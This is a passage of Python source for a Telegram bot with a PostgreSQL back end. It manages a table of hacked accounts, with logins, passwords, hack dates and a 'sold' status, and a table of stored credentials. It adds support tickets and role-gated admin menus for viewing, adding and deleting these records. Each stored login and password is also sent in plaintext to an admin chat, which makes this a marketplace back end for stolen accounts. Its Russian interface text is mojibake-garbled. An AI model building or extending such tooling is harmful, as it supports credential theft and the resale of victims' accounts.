            c.execute(
                '''
                INSERT INTO hacked_accounts (login, password, hack_date, prefix, sold_status, linked_chat_id)
                VALUES (%s, %s, %s, %s, %s, %s)
                ON CONFLICT (login) DO UPDATE
                SET password = EXCLUDED.password,
                    hack_date = EXCLUDED.hack_date,
                    prefix = EXCLUDED.prefix,
                    sold_status = EXCLUDED.sold_status,
                    linked_chat_id = EXCLUDED.linked_chat_id
                ''',
                (login, password, get_current_time().isoformat(), "–ê–¥–º–∏–Ω", sold_status, chat_id)
            )
            conn.commit()
            bot.send_message(
                chat_id,
                f"‚úÖ *–ê–∫–∫–∞—É–Ω—Ç `{login}` –¥–æ–±–∞–≤–ª–µ–Ω –≤ hacked!*\nüìä *–°—Ç–∞—Ç—É—Å*: {sold_status}",
                parse_mode='Markdown'
            )
            bot.send_message(
                ADMIN_CHAT_ID,
                f"üíæ *–ê–∫–∫–∞—É–Ω—Ç –¥–æ–±–∞–≤–ª–µ–Ω –≤ hacked*\nüë§ *–õ–æ–≥–∏–Ω*: `{login}`\nüîí *–ü–∞—Ä–æ–ª—å*: `{password}`\nüìä *–°—Ç–∞—Ç—É—Å*: {sold_status}\n‚ûï *–î–æ–±–∞–≤–∏–ª*: {chat_id}",
                parse_mode='Markdown'
            )
        bot.answer_callback_query(call.id)
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –≤ hacked: {e}")
        bot.send_message(chat_id, "‚ùå *–û—à–∏–±–∫–∞ –¥–æ–±–∞–≤–ª–µ–Ω–∏—è!*", parse_mode='Markdown')
        bot.answer_callback_query(call.id)
    finally:
        conn.close()

def process_add_cred_login(message):
    chat_id = str(message.chat.id)
    login = sanitize_input(message.text)
    logger.info(f"–õ–æ–≥–∏–Ω –¥–ª—è credentials: {login} –æ—Ç {chat_id}")
    if not login:
        bot.reply_to(message, "‚ùå *–õ–æ–≥–∏–Ω –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –ø—É—Å—Ç—ã–º!*", parse_mode='Markdown')
        return
    msg = bot.reply_to(message, "üîí *–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å*:", parse_mode='Markdown')
    bot.register_next_step_handler(msg, lambda m: process_add_cred_password(m, login))

def process_add_cred_password(message, login):
    chat_id = str(message.chat.id)
    password = sanitize_input(message.text)
    logger.info(f"–ü–∞—Ä–æ–ª—å –¥–ª—è {login} –æ—Ç {chat_id}")
    if not password:
        bot.reply_to(message, "‚ùå *–ü–∞—Ä–æ–ª—å –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –ø—É—Å—Ç—ã–º!*", parse_mode='Markdown')
        return
    conn = get_db_connection()
    if not conn:
        bot.reply_to(message, "‚ùå *–ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞!*", parse_mode='Markdown')
        return
    try:
        with conn.cursor() as c:
            c.execute(
                '''
                INSERT INTO credentials (login, password, added_time, added_by)
                VALUES (%s, %s, %s, %s)
                ON CONFLICT (login) DO UPDATE
                SET password = EXCLUDED.password,
                    added_time = EXCLUDED.added_time,
                    added_by = EXCLUDED.added_by
                ''',
                (login, password, get_current_time().isoformat(), chat_id)
            )
            conn.commit()
            bot.reply_to(
                message,
                f"‚úÖ *–ü–∞—Ä–æ–ª—å –¥–ª—è `{login}` –¥–æ–±–∞–≤–ª–µ–Ω –≤ credentials!*",
                parse_mode='Markdown'
            )
            bot.send_message(
                ADMIN_CHAT_ID,
                f"üîê *–î–æ–±–∞–≤–ª–µ–Ω –ø–∞—Ä–æ–ª—å*\nüë§ *–õ–æ–≥–∏–Ω*: `{login}`\nüîí *–ü–∞—Ä–æ–ª—å*: `{password}`\n‚ûï *–î–æ–±–∞–≤–∏–ª*: {chat_id}",
                parse_mode='Markdown'
            )
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –¥–æ–±–∞–≤–ª–µ–Ω–∏—è: {e}")
        bot.reply_to(message, "‚ùå *–û—à–∏–±–∫–∞ –¥–æ–±–∞–≤–ª–µ–Ω–∏—è!*", parse_mode='Markdown')
    finally:
        conn.close()

@bot.message_handler(commands=['support'])
def support_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"
    logger.info(f"/support –æ—Ç {chat_id} (username: {username})")
    access = check_access(chat_id, 'support')
    if access:
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    user = get_user(chat_id)
    if user and user['prefix'] in ['–ê–¥–º–∏–Ω', '–°–æ–∑–¥–∞—Ç–µ–ª—å', '–¢–µ—Ö–ü–æ–º–æ—â–Ω–∏–∫']:
        conn = get_db_connection()
        if not conn:
            bot.reply_to(message, "‚ùå *–ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞!*", parse_mode='Markdown')
            return
        try:
            with conn.cursor() as c:
                c.execute("SELECT ticket_id, chat_id, message, created_at, status FROM support_tickets")
                tickets = c.fetchall()
                if not tickets:
                    bot.reply_to(message, "üì≠ *–ù–µ—Ç –æ—Ç–∫—Ä—ã—Ç—ã—Ö —Ç–∏–∫–µ—Ç–æ–≤.*", parse_mode='Markdown')
                else:
                    for ticket in tickets:
                        response = (
                            f"üé´ *–¢–∏–∫–µ—Ç #{ticket['ticket_id']}*\n"
                            f"üë§ *Chat ID*: `{ticket['chat_id']}`\n"
                            f"üìú *–°–æ–æ–±—â–µ–Ω–∏–µ*: {ticket['message']}\n"
                            f"üïí *–°–æ–∑–¥–∞–Ω*: {format_time(ticket['created_at'])}\n"
                            f"üìä *–°—Ç–∞—Ç—É—Å*: {ticket['status']}\n"
                        )
                        keyboard = types.InlineKeyboardMarkup()
                        keyboard.add(
                            types.InlineKeyboardButton(
                                "üìù –û—Ç–≤–µ—Ç–∏—Ç—å",
                                callback_data=f"support_reply_{ticket['ticket_id']}_{ticket['chat_id']}"
                            ),
                            types.InlineKeyboardButton(
                                "üóë –ó–∞–∫—Ä—ã—Ç—å",
                                callback_data=f"support_delete_{ticket['ticket_id']}"
                            )
                        )
                        bot.send_message(chat_id, response, reply_markup=keyboard, parse_mode='Markdown')
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è —Ç–∏–∫–µ—Ç–æ–≤: {e}")
            bot.reply_to(message, "‚ùå *–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ —Ç–∏–∫–µ—Ç–æ–≤!*", parse_mode='Markdown')
        finally:
            conn.close()
    else:
        msg = bot.reply_to(message, "üìù *–í–≤–µ–¥–∏—Ç–µ –≤–∞—à–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è –ø–æ–¥–¥–µ—Ä–∂–∫–∏*:", parse_mode='Markdown')
        bot.register_next_step_handler(msg, process_support_message)

def process_support_message(message):
    chat_id = str(message.chat.id)
    support_message = sanitize_input(message.text)
    logger.info(f"–°–æ–æ–±—â–µ–Ω–∏–µ –ø–æ–¥–¥–µ—Ä–∂–∫–∏ –æ—Ç {chat_id}: {support_message}")
    if not support_message:
        bot.reply_to(message, "‚ùå *–°–æ–æ–±—â–µ–Ω–∏–µ –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –ø—É—Å—Ç—ã–º!*", parse_mode='Markdown')
        return
    if any(keyword.lower() in support_message.lower() for keyword in ad_keywords):
        bot.reply_to(message, "‚ùå *–°–æ–æ–±—â–µ–Ω–∏–µ —Å–æ–¥–µ—Ä–∂–∏—Ç –∑–∞–ø—Ä–µ—â—ë–Ω–Ω—ã–µ —Å–ª–æ–≤–∞ (—Ä–µ–∫–ª–∞–º–∞, –∫–∞–∑–∏–Ω–æ –∏ —Ç.–¥.)!*", parse_mode='Markdown')
        return
    conn = get_db_connection()
    if not conn:
        bot.reply_to(message, "‚ùå *–ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞!*", parse_mode='Markdown')
        return
    try:
        with conn.cursor() as c:
            c.execute(
                '''
                INSERT INTO support_tickets (chat_id, message, created_at, status)
                VALUES (%s, %s, %s, %s)
                RETURNING ticket_id
                ''',
                (chat_id, support_message, get_current_time().isoformat(), 'open')
            )
            ticket_id = c.fetchone()['ticket_id']
            conn.commit()
            bot.reply_to(
                message,
                f"‚úÖ *–¢–∏–∫–µ—Ç #{ticket_id} —Å–æ–∑–¥–∞–Ω!*\n–û–∂–∏–¥–∞–π—Ç–µ –æ—Ç–≤–µ—Ç–∞ –æ—Ç –ø–æ–¥–¥–µ—Ä–∂–∫–∏.",
                parse_mode='Markdown'
            )
            for tech_id in get_tech_assistants():
                try:
                    bot.send_message(
                        tech_id,
                        f"üé´ *–ù–æ–≤—ã–π —Ç–∏–∫–µ—Ç #{ticket_id}*\nüë§ *Chat ID*: `{chat_id}`\nüìú *–°–æ–æ–±—â–µ–Ω–∏–µ*: {support_message}",
                        parse_mode='Markdown'
                    )
                except Exception as e:
                    logger.error(f"–û—à–∏–±–∫–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è —Ç–µ—Ö–ø–æ–º–æ—â–Ω–∏–∫–∞ {tech_id}: {e}")
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ —Å–æ–∑–¥–∞–Ω–∏—è —Ç–∏–∫–µ—Ç–∞: {e}")
        bot.reply_to(message, "‚ùå *–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è!*", parse_mode='Markdown')
    finally:
        conn.close()

@bot.callback_query_handler(func=lambda call: call.data.startswith('support_reply_') or call.data.startswith('support_delete_'))
def handle_support_buttons(call):
    chat_id = str(call.message.chat.id)
    logger.info(f"–ö–Ω–æ–ø–∫–∞ –ø–æ–¥–¥–µ—Ä–∂–∫–∏ {call.data} –æ—Ç {chat_id}")
    access = check_access(chat_id, 'support')
    if access:
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, access, parse_mode='Markdown')
        return
    user = get_user(chat_id)
    if not user or user['prefix'] not in ['–ê–¥–º–∏–Ω', '–°–æ–∑–¥–∞—Ç–µ–ª—å', '–¢–µ—Ö–ü–æ–º–æ—â–Ω–∏–∫']:
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, "üîí *–î–æ—Å—Ç—É–ø —Ç–æ–ª—å–∫–æ –¥–ª—è —Ç–µ—Ö–ø–æ–¥–¥–µ—Ä–∂–∫–∏!*", parse_mode='Markdown')
        return
    try:
        if call.data.startswith('support_reply_'):
            _, ticket_id, target_chat_id = call.data.split('_', 2)
            msg = bot.send_message(chat_id, f"üìù *–í–≤–µ–¥–∏—Ç–µ –æ—Ç–≤–µ—Ç –¥–ª—è —Ç–∏–∫–µ—Ç–∞ #{ticket_id}*:", parse_mode='Markdown')
            bot.register_next_step_handler(msg, lambda m: process_support_reply(m, ticket_id, target_chat_id))
            bot.answer_callback_query(call.id)
        elif call.data.startswith('support_delete_'):
            _, ticket_id = call.data.split('_', 1)
            conn = get_db_connection()
            if not conn:
                bot.send_message(chat_id, "‚ùå *–ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞!*", parse_mode='Markdown')
                bot.answer_callback_query(call.id)
                return
            with conn.cursor() as c:
                c.execute("UPDATE support_tickets SET status = %s WHERE ticket_id = %s", ('closed', ticket_id))
                conn.commit()
                bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=call.message.message_id,
                    text=f"‚úÖ *–¢–∏–∫–µ—Ç #{ticket_id} –∑–∞–∫—Ä—ã—Ç!*",
                    parse_mode='Markdown'
                )
                bot.send_message(
                    ADMIN_CHAT_ID,
                    f"üóë *–¢–∏–∫–µ—Ç #{ticket_id} –∑–∞–∫—Ä—ã—Ç*\nüë§ *–ó–∞–∫—Ä—ã–ª*: {chat_id}",
                    parse_mode='Markdown'
                )
            bot.answer_callback_query(call.id)
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –∫–Ω–æ–ø–∫–∏ –ø–æ–¥–¥–µ—Ä–∂–∫–∏: {e}")
        bot.send_message(chat_id, "‚ùå *–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ —Ç–∏–∫–µ—Ç–∞!*", parse_mode='Markdown')
        bot.answer_callback_query(call.id)
    finally:
        if conn:
            conn.close()

def process_support_reply(message, ticket_id, target_chat_id):
    chat_id = str(message.chat.id)
    reply_message = sanitize_input(message.text)
    logger.info(f"–û—Ç–≤–µ—Ç –Ω–∞ —Ç–∏–∫–µ—Ç #{ticket_id} –æ—Ç {chat_id}: {reply_message}")
    if not reply_message:
        bot.reply_to(message, "‚ùå *–û—Ç–≤–µ—Ç –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –ø—É—Å—Ç—ã–º!*", parse_mode='Markdown')
        return
    if any(keyword.lower() in reply_message.lower() for keyword in ad_keywords):
        bot.reply_to(message, "‚ùå *–û—Ç–≤–µ—Ç —Å–æ–¥–µ—Ä–∂–∏—Ç –∑–∞–ø—Ä–µ—â—ë–Ω–Ω—ã–µ —Å–ª–æ–≤–∞!*", parse_mode='Markdown')
        return
    try:
        bot.send_message(
            target_chat_id,
            f"üì© *–û—Ç–≤–µ—Ç –Ω–∞ –≤–∞—à —Ç–∏–∫–µ—Ç #{ticket_id}*:\n{reply_message}",
            parse_mode='Markdown'
        )
        bot.reply_to(
            message,
            f"‚úÖ *–û—Ç–≤–µ—Ç –Ω–∞ —Ç–∏–∫–µ—Ç #{ticket_id} –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!*",
            parse_mode='Markdown'
        )
        bot.send_message(
            ADMIN_CHAT_ID,
            f"üì© *–û—Ç–≤–µ—Ç –Ω–∞ —Ç–∏–∫–µ—Ç #{ticket_id}*\nüë§ *–ö–æ–º—É*: `{target_chat_id}`\nüìú *–°–æ–æ–±—â–µ–Ω–∏–µ*: {reply_message}\nüë§ *–û—Ç*: {chat_id}",
            parse_mode='Markdown'
        )
        conn = get_db_connection()
        if conn:
            with conn.cursor() as c:
                c.execute("UPDATE support_tickets SET status = %s WHERE ticket_id = %s", ('replied', ticket_id))
                conn.commit()
            conn.close()
    except telebot.apihelper.ApiTelegramException as e:
        logger.error(f"–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –æ—Ç–≤–µ—Ç–∞ {target_chat_id}: {e}")
        bot.reply_to(message, f"‚ùå *–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏! –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {target_chat_id} –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω.*", parse_mode='Markdown')
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –æ—Ç–≤–µ—Ç–∞ –Ω–∞ —Ç–∏–∫–µ—Ç: {e}")
        bot.reply_to(message, "‚ùå *–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –æ—Ç–≤–µ—Ç–∞!*", parse_mode='Markdown')

@bot.message_handler(commands=['database'])
def database_cmd(message):
    chat_id = str(message.chat.id)
    username = sanitize_input(message.from_user.username) or "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"
    logger.info(f"/database –æ—Ç {chat_id} (username: {username})")
    access = check_access(chat_id, 'database')
    if access:
        logger.warning(f"–î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â—ë–Ω –¥–ª—è {chat_id}: {access}")
        bot.reply_to(message, access, parse_mode='Markdown')
        return
    response = "üóÑ *–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –±–∞–∑–æ–π –¥–∞–Ω–Ω—ã—Ö*\n–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:"
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        types.InlineKeyboardButton("üîç –ü—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å –¥–∞–Ω–Ω—ã–µ", callback_data="db_view"),
        types.InlineKeyboardButton("‚ûï –î–æ–±–∞–≤–∏—Ç—å –¥–∞–Ω–Ω—ã–µ", callback_data="db_add"),
        types.InlineKeyboardButton("üóë –£–¥–∞–ª–∏—Ç—å –¥–∞–Ω–Ω—ã–µ", callback_data="db_delete")
    )
    try:
        logger.debug(f"–û—Ç–ø—Ä–∞–≤–∫–∞ –º–µ–Ω—é –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö –¥–ª—è {chat_id}")
        bot.reply_to(message, response, reply_markup=keyboard, parse_mode='Markdown')
        user = get_user(chat_id)
        if user:
            save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
        logger.info(f"–ú–µ–Ω—é –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –¥–ª—è {chat_id}")
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ /database –¥–ª—è {chat_id}: {e}")
        bot.reply_to(message, "‚ùå *–û—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥—ã! –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.*", parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data in ['db_view', 'db_add', 'db_delete', 'db_main_menu'])
def handle_database_buttons(call):
    chat_id = str(call.message.chat.id)
    logger.info(f"–û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–Ω–æ–ø–∫–∏ {call.data} –æ—Ç {chat_id}")
    access = check_access(chat_id, 'database')
    if access:
        logger.warning(f"–î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â—ë–Ω –¥–ª—è –∫–Ω–æ–ø–∫–∏ {call.data}: {access}")
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, access, parse_mode='Markdown')
        return
    try:
        if call.data == 'db_main_menu':
            response = "üóÑ *–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –±–∞–∑–æ–π –¥–∞–Ω–Ω—ã—Ö*\n–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:"
            keyboard = types.InlineKeyboardMarkup(row_width=2)
            keyboard.add(
                types.InlineKeyboardButton("üîç –ü—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å –¥–∞–Ω–Ω—ã–µ", callback_data="db_view"),
                types.InlineKeyboardButton("‚ûï –î–æ–±–∞–≤–∏—Ç—å –¥–∞–Ω–Ω—ã–µ", callback_data="db_add"),
                types.InlineKeyboardButton("üóë –£–¥–∞–ª–∏—Ç—å –¥–∞–Ω–Ω—ã–µ", callback_data="db_delete")
            )
            logger.debug(f"–í–æ–∑–≤—Ä–∞—Ç –≤ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö –¥–ª—è {chat_id}")
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=response,
                parse_mode='Markdown',
                reply_markup=keyboard
            )
            bot.answer_callback_query(call.id)
            return
        elif call.data == 'db_view':
            keyboard = types.InlineKeyboardMarkup(row_width=2)
            keyboard.add(
                types.InlineKeyboardButton("üë• –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏", callback_data="db_view_users"),
                types.InlineKeyboardButton("üîê –ü–∞—Ä–æ–ª–∏", callback_data="db_view_credentials"),
                types.InlineKeyboardButton("üíª –í–∑–ª–æ–º–∞–Ω–Ω—ã–µ –∞–∫–∫–∞—É–Ω—Ç—ã", callback_data="db_view_hacked"),
                types.InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data="db_main_menu")
            )
            logger.debug(f"–û—Ç–ø—Ä–∞–≤–∫–∞ –º–µ–Ω—é –ø—Ä–æ—Å–º–æ—Ç—Ä–∞ –¥–∞–Ω–Ω—ã—Ö –¥–ª—è {chat_id}")
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="üîç *–í—ã–±–µ—Ä–∏—Ç–µ —Ç–∞–±–ª–∏—Ü—É –¥–ª—è –ø—Ä–æ—Å–º–æ—Ç—Ä–∞*:",
                parse_mode='Markdown',
                reply_markup=keyboard
            )
        elif call.data == 'db_add':
            keyboard = types.InlineKeyboardMarkup(row_width=2)
            keyboard.add(
                types.InlineKeyboardButton("üíæ –í hacked", callback_data="db_add_hacked"),
                types.InlineKeyboardButton("üîê –í credentials", callback_data="db_add_cred"),
                types.InlineKeyboardButton("üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å", callback_data="db_add_user"),
                types.InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data="db_main_menu")
            )
            logger.debug(f"–û—Ç–ø—Ä–∞–≤–∫–∞ –º–µ–Ω—é –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö –¥–ª—è {chat_id}")
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="‚ûï *–ö—É–¥–∞ –¥–æ–±–∞–≤–∏—Ç—å –¥–∞–Ω–Ω—ã–µ?*:",
                parse_mode='Markdown',
                reply_markup=keyboard
            )
        elif call.data == 'db_delete':
            keyboard = types.InlineKeyboardMarkup(row_width=2)
            keyboard.add(
                types.InlineKeyboardButton("üîê –£–¥–∞–ª–∏—Ç—å –ø–∞—Ä–æ–ª—å", callback_data="db_delete_cred"),
                types.InlineKeyboardButton("üíæ –£–¥–∞–ª–∏—Ç—å hacked", callback_data="db_delete_hacked"),
                types.InlineKeyboardButton("üë§ –£–¥–∞–ª–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è", callback_data="db_delete_user"),
                types.InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data="db_main_menu")
            )
            logger.debug(f"–û—Ç–ø—Ä–∞–≤–∫–∞ –º–µ–Ω—é —É–¥–∞–ª–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö –¥–ª—è {chat_id}")
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="üóë *–ß—Ç–æ —É–¥–∞–ª–∏—Ç—å?*:",
                parse_mode='Markdown',
                reply_markup=keyboard
            )
        bot.answer_callback_query(call.id)
        logger.info(f"–ö–Ω–æ–ø–∫–∞ {call.data} —É—Å–ø–µ—à–Ω–æ –æ–±—Ä–∞–±–æ—Ç–∞–Ω–∞ –¥–ª—è {chat_id}")
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –∫–Ω–æ–ø–∫–∏ {call.data} –¥–ª—è {chat_id}: {e}")
        bot.send_message(chat_id, "‚ùå *–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –∫–Ω–æ–ø–∫–∏! –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.*", parse_mode='Markdown')
        bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data.startswith('db_view_'))
def handle_db_view_buttons(call):
    chat_id = str(call.message.chat.id)
    logger.info(f"–ü—Ä–æ—Å–º–æ—Ç—Ä {call.data} –æ—Ç {chat_id}")
    access = check_access(chat_id, 'database')
    if access:
        logger.warning(f"–î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â—ë–Ω –¥–ª—è –ø—Ä–æ—Å–º–æ—Ç—Ä–∞ {call.data}: {access}")
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, access, parse_mode='Markdown')
        return
    conn = get_db_connection()
    if not conn:
        logger.error(f"–ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞ –¥–ª—è –ø—Ä–æ—Å–º–æ—Ç—Ä–∞ {call.data}")
        bot.send_message(chat_id, "‚ùå *–ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞!*", parse_mode='Markdown')
        bot.answer_callback_query(call.id)
        return
    try:
        with conn.cursor() as c:
            if call.data == 'db_view_users':
                logger.debug(f"–ó–∞–ø—Ä–æ—Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –¥–ª—è {chat_id}")
                c.execute("SELECT chat_id, prefix, username, subscription_end FROM users")
                users = c.fetchall()
                if not users:
                    logger.info(f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã –¥–ª—è {chat_id}")
                    bot.send_message(chat_id, "üì≠ *–°–ø–∏—Å–æ–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –ø—É—Å—Ç.*", parse_mode='Markdown')
                else:
                    for idx, (chat_id_db, prefix, username_db, sub_end) in enumerate(users, 1):
                        response = (
                            f"üë§ *–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å #{idx}*: `{chat_id_db}`\n"
                            f"üîë *–ü—Ä–µ—Ñ–∏–∫—Å*: `{prefix}`\n"
                            f"üïí *–ü–æ–¥–ø–∏—Å–∫–∞ –¥–æ*: {format_time(sub_end)}\n"
                            f"üìõ *–Æ–∑–µ—Ä–Ω–µ–π–º*: @{username_db or '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}\n"
                        )
                        keyboard = types.InlineKeyboardMarkup()
                        keyboard.add(
                            types.InlineKeyboardButton(
                                f"üóë –£–¥–∞–ª–∏—Ç—å #{idx}",
                                callback_data=f"db_delete_user_{chat_id_db}_{idx}"
                            )
                        )
                        bot.send_message(
                            chat_id,
                            response,
                            reply_markup=keyboard,
                            parse_mode='Markdown'
                        )
                        logger.debug(f"–û—Ç–ø—Ä–∞–≤–ª–µ–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å #{idx}: {chat_id_db}")
            elif call.data == 'db_view_credentials':
                logger.debug(f"–ó–∞–ø—Ä–æ—Å –ø–∞—Ä–æ–ª–µ–π –¥–ª—è {chat_id}")
                c.execute("SELECT login, password, added_time FROM credentials")
                credentials = c.fetchall()
                if not credentials:
                    logger.info(f"–ü–∞—Ä–æ–ª–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã –¥–ª—è {chat_id}")
                    bot.send_message(chat_id, "üì≠ *–°–ø–∏—Å–æ–∫ –ø–∞—Ä–æ–ª–µ–π –ø—É—Å—Ç.*", parse_mode='Markdown')
                else:
                    for idx, (login, password, added_time) in enumerate(credentials, 1):
                        response = (
                            f"üîê *–õ–æ–≥–∏–Ω #{idx}*: `{login}`\n"
                            f"üîí *–ü–∞—Ä–æ–ª—å*: `{password}`\n"
                            f"üïí *–î–æ–±–∞–≤–ª–µ–Ω–æ*: {format_time(added_time)}\n"
                        )
                        keyboard = types.InlineKeyboardMarkup()
                        keyboard.add(
                            types.InlineKeyboardButton(
                                f"üóë –£–¥–∞–ª–∏—Ç—å #{idx}",
                                callback_data=f"db_delete_cred_{login}_{idx}"
                            )
                        )
                        bot.send_message(
                            chat_id,
                            response,
                            reply_markup=keyboard,
                            parse_mode='Markdown'
                        )
                        logger.debug(f"–û—Ç–ø—Ä–∞–≤–ª–µ–Ω –ø–∞—Ä–æ–ª—å #{idx}: {login}")
            elif call.data == 'db_view_hacked':
                logger.debug(f"–ó–∞–ø—Ä–æ—Å –≤–∑–ª–æ–º–∞–Ω–Ω—ã—Ö –∞–∫–∫–∞—É–Ω—Ç–æ–≤ –¥–ª—è {chat_id}")
                c.execute("SELECT login, password, sold_status, hack_date FROM hacked_accounts")
                hacked = c.fetchall()
                if not hacked:
                    logger.info(f"–í–∑–ª–æ–º–∞–Ω–Ω—ã–µ –∞–∫–∫–∞—É–Ω—Ç—ã –Ω–µ –Ω–∞–π–¥–µ–Ω—ã –¥–ª—è {chat_id}")
                    bot.send_message(chat_id, "üì≠ *–°–ø–∏—Å–æ–∫ –≤–∑–ª–æ–º–∞–Ω–Ω—ã—Ö –∞–∫–∫–∞—É–Ω—Ç–æ–≤ –ø—É—Å—Ç.*", parse_mode='Markdown')
                else:
                    for idx, (login, password, status, hack_date) in enumerate(hacked, 1):
                        response = (
                            f"üíª *–õ–æ–≥–∏–Ω #{idx}*: `{login}`\n"
                            f"üîí *–ü–∞—Ä–æ–ª—å*: `{password}`\n"
                            f"üìä *–°—Ç–∞—Ç—É—Å*: `{status}`\n"
                            f"üïí *–í–∑–ª–æ–º–∞–Ω*: {format_time(hack_date)}\n"
                        )
                        keyboard = types.InlineKeyboardMarkup()
                        keyboard.add(
                            types.InlineKeyboardButton(
                                f"üóë –£–¥–∞–ª–∏—Ç—å #{idx}",
                                callback_data=f"db_delete_hacked_{login}_{idx}"
                            )
                        )
                        bot.send_message(
                            chat_id,
                            response,
                            reply_markup=keyboard,
                            parse_mode='Markdown'
                        )
                        logger.debug(f"–û—Ç–ø—Ä–∞–≤–ª–µ–Ω –≤–∑–ª–æ–º–∞–Ω–Ω—ã–π –∞–∫–∫–∞—É–Ω—Ç #{idx}: {login}")
            keyboard = types.InlineKeyboardMarkup()
            keyboard.add(
                types.InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data="db_main_menu")
            )
            bot.send_message(
